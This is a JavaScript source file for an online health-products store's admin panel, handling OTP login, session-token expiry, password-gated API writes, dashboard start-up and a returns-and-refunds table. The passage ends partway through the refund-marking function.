// ADMIN-CORE.JS
// ─────────────────────────────────────────────
// Extracted from admin.html inline blocks 6, 8, 9 (19 Aug 2026, Manus SEO pass).
// Order follows the original document order. Block 6 = polyfills/config/auth/dashboard;
// Block 8 = ADMIN v26 app shell; Block 9 = bottom-nav sync.

/* ══ block 6 ══ */

// ═══════════════════════════════════════════════
// POLYFILLS
// ═══════════════════════════════════════════════
if (!AbortSignal.timeout) {
  AbortSignal.timeout = function(ms) {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(new DOMException('TimeoutError','TimeoutError')), ms);
    return ctrl.signal;
  };
}

// ═══════════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════════
const API = 'https://ascovitahealthcare-cell-github-io.onrender.com';
let authToken = sessionStorage.getItem('ascovita_token') || '';
let allOrders = [], allProducts = [], allCustomers = [], allDiscounts = [], allPayments = [];

// XSS-safe HTML escaping for all user/API data rendered into innerHTML
function esc(str) {
  if (str === null || str === undefined) return '';
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
let editingProductId = null, editingCouponId = null, currentProductFilter = 'all', currentInvFilter = 'all';
let showDeletedProducts = false;

// ── Wake up Render server immediately on page load ──────────
// Render free tier spins down after inactivity. Ping /health as soon
// as the page loads so the server is warm by the time the user hits Sign In.
(function wakeServer() {
  const hint = document.getElementById('loginError');
  fetch(`${API}/health`, { signal: AbortSignal.timeout(90000) })
    .then(r => {
      if (r.ok && hint) { hint.style.display = 'none'; }
    })
    .catch(() => {
      // Server unreachable — show a gentle hint on the login screen
      if (hint) {
        hint.style.background = '#1a3a2a';
        hint.style.color = '#4ade80';
        hint.textContent = '⏳ Backend is starting up… this takes ~30–60s. Please wait.';
        hint.style.display = 'block';
        // Re-ping every 10s until the server responds
        const interval = setInterval(() => {
          fetch(`${API}/health`, { signal: AbortSignal.timeout(10000) })
            .then(r => { if (r.ok) { clearInterval(interval); hint.style.display = 'none'; } })
            .catch(() => {});
        }, 10000);
      }
    });
})();

// ═══════════════════════════════════════════════
// AUTH
// ═══════════════════════════════════════════════
async function doLogin() {
  const user = document.getElementById('loginUser').value.trim();
  const pass = document.getElementById('loginPass').value.trim();
  const err  = document.getElementById('loginError');
  const btn  = document.getElementById('loginSubmitBtn');

  // ── Step 2: password already matched; the server emailed a 6-digit code
  //    and is waiting for { nonce, code } to complete the sign-in.
  if (_otpNonce && document.getElementById('otpStep').style.display !== 'none') {
    const code = document.getElementById('loginOtp').value.replace(/\D/g, '').trim();
    if (!code) { err.textContent = 'Enter the 6-digit code from your email.'; err.style.display='block'; return; }
    err.style.display = 'none';
    btn.disabled = true;
    btn.textContent = 'Verifying…';
    try {
      const r = await fetch(`${API}/api/admin/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: user, password: pass, nonce: _otpNonce, code }),
      });
      const d = await r.json();
      if (!r.ok || !d.token) {
        err.style.background = '';
        err.style.color = '';
        err.textContent = 'Invalid code.';
        err.style.display = 'block';
        btn.disabled = false;
        btn.textContent = 'Verify code →';
        return;
      }
      clearOtpStep();
      authToken = d.token; // put the fresh token in memory before the shared finish
      __loginSuccess(d);
      return;
    } catch(e) {
      err.textContent = 'Cannot reach server — check your connection.';
      err.style.display = 'block';
      btn.disabled = false;
      btn.textContent = 'Verify code →';
      return;
    }
  }

  if (!user || !pass) { err.textContent = 'Enter username and password.'; err.style.display='block'; return; }

  err.style.display = 'none';
  btn.disabled = true;
  btn.textContent = 'Signing in…';

  // Render free tier can take up to 90s to cold-start — retry up to 3 times
  const MAX_TRIES = 3;
  const TIMEOUT_MS = 35000; // 35s per attempt

  for (let attempt = 1; attempt <= MAX_TRIES; attempt++) {
    try {
      if (attempt > 1) {
        err.style.background = '#1a3a2a';
        err.style.color = '#4ade80';
        err.textContent = `⏳ Server is waking up… attempt ${attempt}/${MAX_TRIES} (this can take ~60s on first load)`;
        err.style.display = 'block';
      }

      const r = await fetch(`${API}/api/admin/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: user, password: pass }),
        signal: AbortSignal.timeout(TIMEOUT_MS),
      });

      const d = await r.json();
      if (d && d.pending_otp) {
        // ── Step 1 done: password matched — a code was emailed. Reveal the
        //    OTP field; signing in now finishes by entering it.
        _otpNonce = d.nonce;
        _otpUser = user; _otpPass = pass;
        document.getElementById('otpStep').style.display = 'block';
        btn.style.marginTop = '14px';
        btn.textContent = 'Verify code →';
        btn.disabled = false;
        err.style.display = 'none';
        const hint = document.getElementById('otpHint');
        hint.style.display = 'block';
        hint.textContent = 'A 6-digit code was sent · valid for 5 minutes';
        const otpField = document.getElementById('loginOtp');
        otpField.value = '';
        otpField.focus();
        document.getElementById('loginPass').readOnly = true;
        document.getElementById('loginUser').readOnly = true;
        return;
      }
      if (!r.ok || !d.token) {
        err.style.background = '';
        err.style.color = '';
        err.textContent = d.error || 'Invalid username or password.';
        err.style.display = 'block';
        btn.disabled = false;
        btn.textContent = 'Sign In →';
        return;
      }

      // Success — the server matched the password and returned the token directly.
      authToken = d.token; // put the fresh token in memory before the shared finish
      __loginSuccess(d);
      return;

    } catch(e) {
      const isTimeout = e.name === 'TimeoutError' || e.name === 'AbortError';
      if (attempt < MAX_TRIES && isTimeout) {
        // Wait 2s then retry
        await new Promise(res => setTimeout(res, 2000));
        continue;
      }
      // Final failure
      err.style.background = '';
      err.style.color = '';
      err.textContent = isTimeout
        ? '⚠️ Server is taking too long to respond. It may be starting up — please try again in 30 seconds.'
        : 'Cannot reach server. Check your internet connection.';
      err.style.display = 'block';
      btn.disabled = false;
      btn.textContent = 'Sign In →';
      return;
    }
  }
}

// ── Email OTP step state ────────────────────────────────────────────
// The password stays in memory only while the OTP step is active, so a
// stale page refresh or a second tab cannot reuse it.
let _otpNonce = null, _otpUser = '', _otpPass = '';
function clearOtpStep() {
  _otpNonce = null; _otpUser = ''; _otpPass = '';
  document.getElementById('otpStep').style.display = 'none';
  document.getElementById('loginPass').readOnly = false;
  document.getElementById('loginUser').readOnly = false;
  const btn = document.getElementById('loginSubmitBtn');
  btn.textContent = 'Sign In →';
  btn.style.marginTop = '20px';
}
async function otpResend() {
  if (!_otpUser || !_otpPass || !_otpNonce) return;
  const hint = document.getElementById('otpHint');
  const btn = document.getElementById('otpResendBtn');
  btn.disabled = true;
  btn.textContent = '📩 Sending…';
  try {
    // Re-post step 1 with the same credentials — the server always mints
    // a fresh code for a new attempt and abandons the old one.
    const r = await fetch(`${API}/api/admin/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: _otpUser, password: _otpPass }),
    });
    const d = await r.json();
    if (d && d.pending_otp && d.nonce) {
      _otpNonce = d.nonce;
      hint.textContent = 'A fresh 6-digit code was sent · valid for 5 minutes';
      document.getElementById('loginOtp').value = '';
      document.getElementById('loginOtp').focus();
    } else {
      hint.textContent = d.error || 'Could not send a new code — try signing in again.';
    }
  } catch(e) {
    hint.textContent = 'Cannot reach server — check your connection.';
  }
  btn.disabled = false;
  btn.textContent = '📩 Resend';
}
// The Enter-to-submit listener that used to live here is gone: the login
// card is a real <form> now, so Enter already submits it — from either
// field, not just the password one. Leaving both in place fired doLogin()
// twice per keypress, which with the new per-account lockout would have
// burned two of the five allowed attempts on every single typo.
// Shared success path entered after a successful password login.
function __loginSuccess(d) {
  sessionStorage.setItem('ascovita_token', d.token); // persist the fresh token
  sessionStorage.setItem('ascovita_role', d.role || 'admin');
  // Cache the session identity so the UI can hide owner/staff features
  // instantly, without a round trip on every render.
  try { apiFetch('/api/admin/me').then(m => {
    if (m && !m.error) localStorage.setItem('ascovita_session', JSON.stringify({
      username: m.username, role: m.role, is_owner: !!m.is_owner,
      permissions: m.permissions, denied: m.denied,
      security: m.security || null,
    }));
  }).catch(() => {}); } catch(e) {}
  try { localStorage.removeItem('ascovita_logout_reason'); } catch(e) {}
  document.getElementById('loginError').style.display = 'none';
  const submitBtn = document.getElementById('loginSubmitBtn');
  if (submitBtn) submitBtn.textContent = '✅ Logged in!';
  document.getElementById('loginScreen').style.display = 'none';
  document.getElementById('app').style.display = 'block';
  applyRole(d.role);
  initApp();
}

function doLogout() {
  sessionStorage.removeItem('ascovita_token');
  sessionStorage.removeItem('ascovita_role');
  try { localStorage.removeItem('ascovita_session'); } catch (e) {}
  authToken = '';
  document.getElementById('app').style.display = 'none';
  document.getElementById('loginScreen').style.display = 'flex';
  // Clear any leftover login-card state from a previous session — without
  // this, an automatic (401-driven) logout leaves the green '✅ Logged in!'
  // button and whatever error text happened to be on #loginError visible
  // at the same time, which reads as 'I just logged in and got logged out'.
  try {
    var err = document.getElementById('loginError');
    if (err) { err.style.display = 'none'; err.style.background = ''; err.style.color = ''; }
    var btn = document.querySelector('.btn-login');
    if (btn) btn.textContent = 'Sign In →';
  } catch (e) {}
}

// Read the token's own expiry without trusting the server round trip.
// JWT payloads are base64URL (- and _, unpadded), not plain base64, so
// normalise before atob() or the decode throws on some payloads.
function tokenExpiryMs(t) {
  try {
    var raw = t || sessionStorage.getItem('ascovita_token');
    if (!raw) return 0;
    var b64 = raw.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
    while (b64.length % 4) b64 += '=';
    return (JSON.parse(atob(b64)).exp || 0) * 1000;
  } catch (e) { return 0; }
}
// A few seconds of leeway: a phone clock a little ahead of the server
// would otherwise read a freshly minted token as expired and report the
// misleading "server rejected your session — check the clock" message.
// Ten seconds of leeway costs nothing against a 1-hour session.
function tokenIsExpired(t) {
  var exp = tokenExpiryMs(t);
  return exp > 0 && exp <= Date.now() - 10000;
}

async function apiFetch(path, opts={}) {
  const method = String(opts.method || 'GET').toUpperCase();
  const writeMethod = /^(POST|PUT|PATCH|DELETE)$/.test(method);
  const pathText = String(path || '');
  const exemptAiWrite = /^\/api\/owner\/ai\/(ask|propose-action)$/.test(pathText);
  const protectedPath = !exemptAiWrite && (/^\/api\/(admin|owner)\//.test(pathText) || pathText === '/api/settings' || pathText === '/api/create-delhivery-order' || /^\/api\/(marketing|delhivery)\//.test(pathText) || /^\/api\/public\/(theme|content)$/.test(pathText));
  const exemptPath = /\/confirm-password$|\/login$/.test(String(path || ''));
  const suppliedHeaders = opts.headers || {};
  const proof = suppliedHeaders['X-Password-Proof'] || suppliedHeaders['x-password-proof'] || (typeof suppliedHeaders.get === 'function' ? suppliedHeaders.get('X-Password-Proof') : '');
  // Central fail-closed client guard: individual screens may still call
  // confirmCriticalAction for a better human prompt, but a newly added Save
  // or approval button cannot accidentally bypass the gate anymore.
  if (writeMethod && protectedPath && !exemptPath && !proof && !opts.__skipPasswordGate) {
    if (typeof confirmCriticalAction !== 'function') throw new Error('Save-password confirmation is unavailable — reload the admin panel');
    const actionName = `${method} ${String(path).split('?')[0]}`;
    return confirmCriticalAction(`Authorize ${actionName}? This change requires your separate save password.`, async function(confirmedProof){
      const nextOpts = { ...opts, __skipPasswordGate: true, headers: { ...suppliedHeaders, 'X-Password-Proof': confirmedProof } };
      delete nextOpts.__skipPasswordGate;
      return apiFetch(path, nextOpts);
    });
  }
  const headers = {'Content-Type':'application/json', 'Authorization':`Bearer ${authToken}`, ...(opts.headers||{})};
  const requestOpts = {...opts};
  delete requestOpts.__skipPasswordGate;
  // Render may need a moment to wake after inactivity, and mobile networks
  // can drop one request during a handover. Retry only transport failures;
  // never retry an HTTP response or a protected action with a second proof.
  async function fetchAdminOnce() {
    const callOpts = {...requestOpts, headers};
    callOpts.signal = opts.signal || AbortSignal.timeout(30000);
    return fetch(`${API}${path}`, callOpts);
  }
  let r;
  try {
    r = await fetchAdminOnce();
  } catch (networkError) {
    if (opts.signal) throw networkError;
    await new Promise(resolve => setTimeout(resolve, 1500));
    r = await fetchAdminOnce();
  }
  // A 401 used to call doLogout() and nothing else. The login screen then
  // appeared with whatever text happened to be sitting in #loginError —
  // in practice "Invalid credentials. Please try again.", which sends the
  // admin off checking a password that was never wrong. Record WHY the
  // session ended so the screen can say something true.
  //
  // The two cases need different words, because they have different
  // causes and different fixes:
  //   expired  — the token's own exp has passed. Normal, 1-hour policy.
  //   rejected — the token still looks valid here but the server refused
  //              it. That means a revoked session, a server restart with a
  //              new JWT_SECRET, or a device clock that disagrees with the
  //              server. Saying "expired" for this would hide a real fault.
  //
  // initApp() fires a dozen calls at once, so one dead token produces a
  // dozen simultaneous 401s — first reason recorded wins, the rest are
  // no-ops rather than a dozen competing messages.
  if(r.status === 401) {
    // A password-confirmation failure or a protected write rejection is not
    // proof that the login session expired. Returning the response lets the
    // modal/save handler show the real server error instead of logging the
    // user out. Only read-session failures below should redirect to login.
    if (exemptPath || (writeMethod && protectedPath)) return r;
    // The server now names its privileged 401s with a `reason` code —
    // 'invalid-signature' (JWT_SECRET cannot verify, needs a Render fix)
    // or 'token-version-mismatch' (a real revocation). Reading the body
    // here lets the logout banner say WHY instead of the generic
    // "check your clock" text that never helped anyone.
    var _why401 = '';
    try {
      if (r.headers.get && (r.headers.get('content-type') || '').includes('json')) {
        var _b = await r.clone().json();
        if (_b && typeof _b.reason === 'string') _why401 = _b.reason;
      }
    } catch(e) { _why401 = ''; }
    // One bad 401 must not destroy the session on mobile. Two mobile
    // realities cause transient 401s on a perfectly valid session:
    //   • the in-memory authToken can go stale ('' after a Safari memory
    //     purge, or the pre-login page's empty string) while localStorage
    //     still holds the real token — refreshing the header rescues it;
    //   • the server's token-version cache can briefly disagree
    //     (now self-healing server-side, but one retry on top adds
    //     belt-and-braces).
    // So: re-read the token from storage, and if it still looks valid,
    // try the request ONCE more before giving up.
    var stored = sessionStorage.getItem('ascovita_token') || '';
    if (!authToken && stored && !tokenIsExpired(stored)) {
      authToken = stored;
      opts.headers = Object.assign({}, opts.headers || {});
      opts.headers['Authorization'] = 'Bearer ' + authToken;
      headers.Authorization = 'Bearer ' + authToken;
      try {
        var rr = await fetch(`${API}${path}`, { ...requestOpts, headers, signal: AbortSignal.timeout(30000) });
        if (rr.ok || rr.status !== 401) return rr;
      } catch (e) { /* fall through to a real logout below */ }
    }
    // ── FIX (mobile session bounce): a token minted moments ago that
    // gets a 401 is almost never a real revocation — it is the transient
    // token-version race between the panel's startup burst and the
    // server's in-memory cache (Render instance churn / a brief DB
    // blip). Revocation is a rare, deliberate owner action; the panel
    // must never kick an admin out of a session that is seconds old.
    // A freshly minted token (a 60-minute session with more than 55
    // minutes of life left) gets one extra attempt after a short
    // backoff — by then the server's own self-heal has resynced its
    // cache and the retry succeeds. Genuinely revoked sessions still
    // log out on the second refusal.
    var freshExp = tokenExpiryMs(stored || authToken);
    var tokenFresh = freshExp > 0 && (freshExp - Date.now()) > 55 * 60_000;
    if (tokenFresh && !window.__freshTokenRetryDone) {
      window.__freshTokenRetryDone = true;   // bound to once per session
      try {
        await new Promise(res => setTimeout(res, 1500));
        var retry = await fetch(`${API}${path}`, { ...requestOpts, headers, signal: AbortSignal.timeout(30000) });
        if (retry.ok || retry.status !== 401) { delete window.__freshTokenRetryDone; return retry; }
      } catch (e) { /* fall through to a real logout below */ }
      delete window.__freshTokenRetryDone;
    }
    try {
      if (!localStorage.getItem('ascovita_logout_reason')) {
        localStorage.setItem('ascovita_logout_reason',
          tokenIsExpired(authToken) ? 'expired' : (_why401 || 'rejected'));
      }
    } catch(e) {}
    doLogout();
    if (typeof showLogoutReason === 'function') showLogoutReason();
    throw new Error('Session expired');
  }
  // Detect HTML error pages (Express "Cannot POST /route" 404s)
  if(!r.ok) {
    const ct = r.headers.get('content-type') || '';
    if(!ct.includes('application/json')) {
      const text = await r.text();
      const match = text.match(/Cannot (POST|PUT|GET|DELETE) ([^\s<"]+)/);
      if(match) throw new Error(`Route missing on server: ${match[1]} ${match[2]} — please deploy the latest server.js to Render`);
      throw new Error(`Server returned ${r.status} (non-JSON) for ${path} — deploy latest server.js to Render`);
    }
  }
  return r;
}

// Multipart admin writes cannot use apiFetch because the browser must set the
// FormData boundary itself. They still use the same fresh save-password proof.
async function adminProofUpload(path, formData, promptText) {
  if (typeof confirmCriticalAction !== 'function') throw new Error('Save-password confirmation is unavailable — reload the admin panel');
  return confirmCriticalAction(promptText || 'Authorize this design upload?', async function(proof) {
    const token = authToken || sessionStorage.getItem('ascovita_token') || '';
    return fetch(`${API}${path}`, {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + token, 'X-Password-Proof': proof },
      body: formData,
    });
  });
}

// ═══════════════════════════════════════════════
// OPTIMISTIC UPDATES
//
// Every admin action used to work the same way: send the request, wait
// for the round trip to Render and back, and only then change what is
// on screen. On a phone on mobile data that is half a second of a
// button that looks broken, and the usual result is a second click.
//
// These apply the change immediately and reconcile afterwards. The part
// that matters is the failure path: if the server refuses, the screen
// must go BACK, and the user must SEE it go back. A silent revert is
// worse than no optimism at all — they walk away believing a product is
// deleted when it is not.
//
// So a rollback does three things: restores the previous state, flashes
// the affected row so the change is visible rather than sneaked in, and
// says plainly what failed.
//
// Deliberately NOT used for anything where the server is the authority
// on whether the action is allowed at all, or where money moves.
// Optimism is for actions that virtually always succeed — not for
// pretending a refusal did not happen.
// ═══════════════════════════════════════════════
function flashRollback(selector) {
  // Make the undo visible. Without this the row quietly returns and the
  // admin never registers that their change did not stick.
  try {
    const el = typeof selector === 'string' ? document.querySelector(selector) : selector;
    if (!el) return;
    el.classList.remove('rollback-flash');
    void el.offsetWidth;              // restart the animation if it is mid-flight
    el.classList.add('rollback-flash');
    setTimeout(() => el.classList.remove('rollback-flash'), 1600);
  } catch (e) { /* a missing element must never break the rollback itself */ }
}

// apply()    — change the UI now
// commit()   — send it; resolve on success, throw on failure
// rollback() — put the UI back exactly as it was
async function optimistic({ apply, commit, rollback, onError, flash, successMsg }) {
  apply();
  try {
    const result = await commit();
    if (successMsg) toast(successMsg);
    return result;
  } catch (e) {
    rollback();
    if (flash) flashRollback(flash);
    const msg = e && e.message ? e.message : 'Action failed';
    toast(`↩️ Reverted — ${msg}`, 'error');
    if (onError) onError(e);
    return null;
  }
}

// apiFetch resolves with the Response and only throws for a non-JSON
// error page, so every optimistic commit needs this: a JSON 400/500
// arrives as a resolved response and would otherwise read as success.
async function expectOk(promise, fallbackMsg) {
  const r = await promise;
  const d = await r.json().catch(() => ({}));
  if (!r.ok) throw new Error(d.error || d.message || fallbackMsg || `Server returned ${r.status}`);
  return d;
}

// ═══════════════════════════════════════════════
// INIT
// ═══════════════════════════════════════════════
async function initApp() {
  document.getElementById('dashDate').textContent = new Date().toLocaleDateString('en-IN', {weekday:'long', day:'numeric', month:'long'});
  checkServerStatus();
  setInterval(checkServerStatus, 60000);
  loadDashboard();
  loadOrders();
  loadProducts();
  loadCustomers();
  loadDiscounts();
  loadInventory();
  // Pending-returns badge in the sidebar. Wrapped so a returns API that
  // is not deployed yet cannot break dashboard start-up.
  try { refreshReturnsBadge(); setInterval(refreshReturnsBadge, 120000); } catch(e) {}
  loadPhotoLibrary();
  // loadBanners() was called here, but `let banners` is declared much
  // further down the file. The function declaration hoists, the `let` does
  // not, so this threw "Cannot access 'banners' before initialization" on
  // every page load. Nothing needed it eagerly either: showPage('banners')
  // already calls loadBanners() when the tab is actually opened.
  renderSchemaOverview();
  // renderIntegrations() reads the INTEGRATIONS const, which is declared far
  // below this point in the same script. initApp() is invoked while the
  // script is still evaluating, so the read landed in its temporal dead zone
  // and threw, taking the rest of initApp() with it. One tick is enough for
  // the declaration to be reached.
  setTimeout(() => { renderIntegrations(); checkIntegrations(); }, 0);
  loadAuditLog();
  startLiveVisitors();
  renderSqlSnippets();
  setTimeout(refreshNotifications, 2500); // let orders/products/customers finish loading first
  setInterval(refreshNotifications, 90000);
}

async function checkServerStatus() {
  const el = document.getElementById('serverStatus');
  try {
    const ctrl = new AbortController(); const tid = setTimeout(()=>ctrl.abort(),8000);
    const t0 = Date.now();
    const r = await fetch(`${API}/`, {signal:ctrl.signal}); clearTimeout(tid);
    const d = await r.json().catch(()=>({}));
    el.innerHTML = `<span class="tb-dot"></span><span style="color:var(--green-text);font-size:0.72rem;">v${d.version||'7.0'} · ${Date.now()-t0}ms</span>`;
  } catch(e) {
    const cold = e.name==='AbortError';
    el.innerHTML = `<span style="background:var(--red);width:7px;height:7px;border-radius:50%;display:inline-block;"></span><span style="color:var(--red);font-size:0.72rem;margin-left:6px;">${cold?'⏳ Waking up…':'Offline'}</span>`;
    if(cold) setTimeout(checkServerStatus, 12000);
  }
}

// Apply role-based UI (called on login and auto-login)
// FIX (owner features invisible): an unknown role must never demote the
// owner to 'admin' — the server is the real enforcer, so default to
// owner-visible until positively proven otherwise.
function applyRole(role) {
  let r = String(role || sessionStorage.getItem('ascovita_role') || '').toLowerCase();
  if (r !== 'owner' && r !== 'admin') {
    try {
      const cached = JSON.parse(localStorage.getItem('ascovita_session') || '{}');
      if (cached.role === 'owner' || cached.role === 'admin') r = cached.role;
    } catch (e) {}
  }
  // Keep the owner-visible shell during a transient /me timeout. The API
  // still enforces every action, so this is never an authorization grant.
  if (r !== 'owner' && r !== 'admin') r = 'owner';
  document.body.classList.remove('role-owner','role-admin');
  document.body.classList.add('role-' + r);
  // Update topbar indicator
  const badge = document.getElementById('roleBadge');
  if(badge) {
    badge.textContent = r === 'owner' ? '👑 Owner' : '🔧 Admin';
    badge.style.background = r === 'owner' ? 'rgba(196,146,14,0.2)' : 'rgba(74,138,40,0.15)';
    badge.style.color = r === 'owner' ? 'var(--gold-text)' : 'var(--green-text)';
  }
  // AI Agent Team nav link — explicitly shown/hidden by role, not just CSS.
  // (The real boundary is server-side: every /api/owner/ai/* route 403s
  // for non-owner tokens regardless of what's visible in this UI.)
  const navAiTeam = document.getElementById('navAiTeam');
  if (navAiTeam) navAiTeam.style.display = (r === 'owner') ? 'flex' : 'none';
  const moreAiTeam = document.getElementById('moreAiTeam');
  if (moreAiTeam) moreAiTeam.style.display = (r === 'owner') ? 'flex' : 'none';
  // Re-render the login audit table so it clears/populates correctly for the active role
  if (typeof renderLoginAudit === 'function') renderLoginAudit();
  return r;
}

// Auto-login if the stored token is still valid.
//
// THE BUG THIS KILLS
//   This used to be `if (authToken)` — the mere PRESENCE of a token in
//   localStorage was taken as proof of a session. Staff tokens are signed
//   with a 1-hour life (ADMIN_SESSION_HOURS, server-side), so anyone
//   coming back to the panel after lunch got booted straight into the
//   dashboard on a token that was already dead. initApp() then fires a
//   dozen API calls at once, the first 401 comes back within a second or
//   two, apiFetch calls doLogout(), and the panel they were just looking
//   at vanished back to the login screen with no explanation. It read as
//   "the admin panel logs itself out after a few seconds" — and it
//   happened on every single visit once the hour was up.
//
//   Checking the token's own exp claim first costs nothing, needs no
//   network round trip, and turns a confusing flash-and-bounce into an
//   honest "your session expired, please sign in again".
if (authToken && tokenIsExpired(authToken)) {
  try { localStorage.setItem('ascovita_logout_reason', 'expired'); } catch(e) {}
  sessionStorage.removeItem('ascovita_token');
  authToken = '';
}
if(authToken) {
  document.getElementById('loginScreen').style.display = 'none';
  document.getElementById('app').style.display = 'block';
  applyRole(sessionStorage.getItem('ascovita_role'));
  initApp();
}

// Redraw canvas charts on window resize
window.addEventListener('resize', () => {
  if(allOrders.length) {
    renderRevenueChart(allOrders, _revRange);
    renderStatusChart(allOrders);
    renderPayChart(allOrders);
    renderHourlyChart(allOrders);
  }
});

// ═══════════════════════════════════════════════
// NAVIGATION
// ═══════════════════════════════════════════════
// ══════════════════════════════════════════════════════════════
// RETURNS & REFUNDS (admin)
//
// Approve calls the approve_return() SQL function via the backend, so
// the status change and the VitaPoints clawback happen in ONE
// transaction. If the clawback fails the approval rolls back — there
// is deliberately no way from this UI to approve a return without
// reversing its points.
// ══════════════════════════════════════════════════════════════
let RETURNS_CACHE = [];

function retEsc(v) {
  return String(v == null ? '' : v)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

const RET_BADGE = {
  requested: 'badge-gold', approved: 'badge-green', rejected: 'badge-red',
  picked_up: 'badge-blue', refunded: 'badge-blue', cancelled: 'badge-gray',
};

async function loadReturns() {
  const wrap = document.getElementById('returnsTableWrap');
  if (!wrap) return;
  // showPage can be triggered more than once by navigation and mobile layout
  // listeners. Do not let overlapping requests continually put the table back
  // into Loading… while an earlier request is still in flight.
  if (loadReturns._busy) return;
  loadReturns._busy = true;
  wrap.innerHTML = '<div style="padding:26px;text-align:center;color:var(--text3)">Loading…</div>';
  try {
    const status = (document.getElementById('retFilter') || {}).value || '';
    // apiFetch returns the raw Response, not parsed JSON. A page load must
    // fail visibly rather than wait on a sleeping database/Render instance.
    const d = await (await apiFetch('/api/admin/returns' + (status ? '?status=' + encodeURIComponent(status) : ''), {
      signal: AbortSignal.timeout(20000),
    })).json();
    RETURNS_CACHE = d.returns || [];
    const c = d.counts || {};

    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v || 0; };
    set('retKpiRequested', c.requested); set('retKpiApproved', c.approved);
    set('retKpiPicked', c.picked_up);   set('retKpiRefunded', c.refunded);
    set('retKpiRejected', c.rejected);
    const badge = document.getElementById('returnsBadge');
    if (badge) badge.textContent = c.requested || 0;
    const badgeM = document.getElementById('returnsBadgeM');
    if (badgeM) { badgeM.textContent = c.requested || 0; badgeM.style.display = c.requested ? 'flex' : 'none'; }

    if (!RETURNS_CACHE.length) {
      wrap.innerHTML = '<div style="padding:34px;text-align:center;color:var(--text3)">No return requests' + (status ? ' with status “' + retEsc(status) + '”' : '') + '.</div>';
      return;
    }

    wrap.innerHTML =
      '<table class="table"><thead><tr>'
      + '<th>Order</th><th>Customer</th><th>Items</th><th>Reason</th>'
      + '<th>Requested</th><th>Status</th><th>Points</th><th style="text-align:right">Action</th>'
      + '</tr></thead><tbody>'
      + RETURNS_CACHE.map(function(r){
          const items = (r.items || []).map(function(i){
            return retEsc(i.name || ('#' + i.id)) + ' × ' + i.qty;
          }).join('<br>') || '—';
          const when = new Date(r.created_at).toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'});
          const cls  = RET_BADGE[r.status] || 'badge-gray';
          let action = '';
          if (r.status === 'requested') {
            action = '<button class="btn btn-primary btn-sm" onclick="approveReturn(\'' + r.id + '\')">Approve</button> '
                   + '<button class="btn btn-secondary btn-sm" onclick="rejectReturn(\'' + r.id + '\')">Reject</button>';
          } else if (r.status === 'approved') {
            action = '<button class="btn btn-secondary btn-sm" onclick="setReturnStatus(\'' + r.id + '\',\'picked_up\')">Mark picked up</button>';
          } else if (r.status === 'picked_up') {
            action = '<button class="btn btn-primary btn-sm" onclick="markRefunded(\'' + r.id + '\')">Mark refunded</button>';
          } else if (r.status === 'refunded' && r.refund_ref) {
            action = '<span style="font-size:.75rem;color:var(--text3)">ref ' + retEsc(r.refund_ref) + '</span>';
          }
          return '<tr>'
            + '<td><strong>' + retEsc(r.order_id) + '</strong></td>'
            + '<td style="font-size:.8rem">' + retEsc(r.customer_email) + '</td>'
            + '<td style="font-size:.78rem">' + items + '</td>'
            + '<td style="font-size:.8rem">' + retEsc(r.reason)
              + (r.comments ? '<div style="color:var(--text3);font-size:.72rem;margin-top:3px">' + retEsc(r.comments) + '</div>' : '')
              + '</td>'
            + '<td style="font-size:.78rem">' + when + '</td>'
            + '<td><span class="badge ' + cls + '">' + retEsc(String(r.status).replace('_',' ')) + '</span>'
              + (r.admin_note ? '<div style="color:var(--text3);font-size:.7rem;margin-top:3px">' + retEsc(r.admin_note) + '</div>' : '')
              + '</td>'
            + '<td>' + (r.points_reversed ? '−' + Number(r.points_reversed).toLocaleString('en-IN') : '—') + '</td>'
            + '<td style="text-align:right;white-space:nowrap">' + action + '</td>'
            + '</tr>';
        }).join('')
      + '</tbody></table>';
  } catch (e) {
    wrap.innerHTML = '<div style="padding:26px;text-align:center;color:var(--red-text)">Could not load returns: ' + retEsc(e.message) + '</div>';
  } finally {
    loadReturns._busy = false;
  }
}

async function approveReturn(id) {
  const r = RETURNS_CACHE.find(function(x){ return x.id === id; }) || {};
  if (!confirm('Approve this return for ' + (r.order_id || 'this order') + '?\n\n'
    + 'The VitaPoints earned on this order will be reversed automatically. '
    + 'If the customer has already spent them the balance is written off to zero and logged.')) return;
  const note = prompt('Internal note (optional):', '') || '';
  try {
    const d = await (await apiFetch('/api/admin/returns/' + id + '/approve', {
      method: 'POST', body: JSON.stringify({ note: note }),
    })).json();
    toast('✅ Approved · ' + (d.points_reversed || 0).toLocaleString('en-IN') + ' VitaPoints reversed');
    loadReturns();
  } catch (e) { toast('❌ ' + e.message, 'error'); }
}

async function rejectReturn(id) {
  const note = prompt('Reason for rejection (shown to the customer):', '');
  if (note === null) return;
  if (!note.trim()) { toast('Please give a reason — the customer sees this', 'error'); return; }
  try {
    await apiFetch('/api/admin/returns/' + id + '/reject', {
      method: 'POST', body: JSON.stringify({ note: note }),
    });
    toast('Return rejected');
    loadReturns();
  } catch (e) { toast('❌ ' + e.message, 'error'); }
}

async function setReturnStatus(id, status) {
  try {
    await confirmCriticalAction('Change this return\u2019s status to \u201c' + status.replace('_', ' ') + '\u201d? This update is password-gated.', async function(proof){
      const r = await apiFetch('/api/admin/returns/' + id + '/status', {
        method: 'PUT',
        headers: proof ? { 'X-Password-Proof': proof } : {},
        body: JSON.stringify({ status: status }),
      });
      const d = await r.json().catch(() => ({}));
      if (!r.ok) throw new Error(d.error || 'Could not update return status');
      toast('Status updated');
      loadReturns();
    });
  } catch (e) { if (String(e.message) !== 'cancelled') toast('❌ ' + e.message, 'error'); }
}

async function markRefunded(id) {
  const r = RETURNS_CACHE.find(function(x){ return x.id === id; }) || {};
  const amt = prompt('Refund amount (₹):', '');
  if (amt === null) return;
